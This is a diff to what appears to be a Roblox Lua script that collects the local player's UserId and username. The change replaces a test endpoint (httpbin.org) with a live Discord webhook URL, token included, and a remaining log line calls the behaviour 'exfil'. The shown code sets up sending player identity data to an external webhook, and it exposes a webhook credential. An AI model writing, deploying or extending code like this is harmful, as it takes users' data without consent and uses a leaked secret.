@@ -10,7 +10,7 @@ local success, result = pcall(function()
 	if LocalPlayer then
 		local UserId = LocalPlayer.UserId
 		local Username = LocalPlayer.Name or "TestUser"
-		local Webhook = "https://httpbin.org/post"
+		local Webhook = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
 	else
 		print("LocalPlayer is nil")
 		return
@@ -147,4 +147,5 @@ if success then
 	print("📡 Test exfil to httpbin.org")
 else
 	warn("❌ Error:", result)
+
 end
